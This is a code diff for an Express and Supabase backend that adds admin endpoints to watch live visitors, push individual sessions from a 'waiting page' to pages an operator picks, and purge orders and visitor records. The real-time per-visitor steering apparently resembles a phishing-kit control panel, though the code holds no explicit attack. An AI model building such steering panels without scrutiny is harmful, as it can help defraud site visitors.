@@ -138,46 +138,72 @@ app.get('/api/visitors/active', async (req, res) => {
   }
 });
 
-// Admin redirect: set redirect_to on the order, and on matching visitor sessions
+// Admin redirect client by order ID
 app.post('/api/admin/redirect', async (req, res) => {
   try {
     if (!isAdmin(req)) return res.status(401).json({ success: false });
     const { order_id, redirect_to } = req.body;
     if (!order_id || !redirect_to) return res.status(400).json({ success: false });
-
-    // Get order's current_page to find the matching visitor
     const { data: order } = await supabase.from('orders').select('current_page').eq('id', order_id).maybeSingle();
-    if (!order) return res.status(404).json({ success: false, message: 'Order not found' });
-
-    // Find active visitors on the same page as the order
+    if (!order) return res.status(404).json({ success: false });
     const cutoff = Date.now() - 30000;
     const page = (order.current_page || '').replace('-fr', '');
-    const { data: activeVisitors } = await supabase.from('visitors').select('id, current_page')
-      .gt('last_active_at', cutoff);
-
-    if (activeVisitors) {
-      const matches = activeVisitors.filter(v => {
-        const vp = (v.current_page || '').replace('-fr', '');
-        return vp === page || vp === page.replace('.html', '');
-      });
-      for (const v of matches) {
-        await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
-      }
-      // If no page match, update all active visitors as fallback
-      if (!matches.length) {
-        for (const v of activeVisitors) {
-          await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
-        }
-      }
+    const { data: av } = await supabase.from('visitors').select('id, current_page').gt('last_active_at', cutoff);
+    if (av) {
+      const m = av.filter(v => { const vp = (v.current_page || '').replace('-fr', ''); return vp === page || vp === page.replace('.html', ''); });
+      for (const v of (m.length ? m : av)) await supabase.from('visitors').update({ redirect_to }).eq('id', v.id);
     }
-
-    // Also store on order
     await supabase.from('orders').update({ redirect_to }).eq('id', order_id);
-
     res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ success: false, message: err.message });
-  }
+  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
+});
+
+// Admin redirect specific visitor by session ID
+app.post('/api/admin/redirect-visitor', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { session_id, page } = req.body;
+    if (!session_id || !page) return res.status(400).json({ success: false });
+    await supabase.from('visitors').update({ redirect_to: page }).eq('session_id', session_id);
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
+});
+
+// Get ALL visitors (admin)
+app.get('/api/visitors/all', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ visitors: [], totalCount: 0 });
+    const { data } = await supabase.from('visitors').select('*').order('last_active_at', { ascending: false });
+    res.json({ visitors: data || [], totalCount: (data || []).length });
+  } catch (err) { res.json({ visitors: [], totalCount: 0 }); }
+});
+
+// Delete inactive clients (admin)
+app.delete('/api/admin/inactive-clients', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const cutoff = Date.now() - 120000;
+    const { data: activeVisitors } = await supabase.from('visitors').select('current_page').gt('last_active_at', cutoff);
+    const activePages = new Set((activeVisitors || []).map(v => v.current_page));
+    const { data: allOrders } = await supabase.from('orders').select('id, current_page');
+    const inactive = (allOrders || []).filter(o => !activePages.has(o.current_page) && o.current_page !== 'success');
+    let deleted = 0;
+    for (const o of inactive) {
+      await supabase.from('orders').delete().eq('id', o.id);
+      deleted++;
+    }
+    res.json({ success: true, deletedCount: deleted });
+  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
+});
+
+// Reset total visitors (admin)
+app.post('/api/admin/reset-visitors', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { error } = await supabase.from('visitors').delete().neq('session_id', '');
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
 });
 
 // Check order status (public - for waiting page)
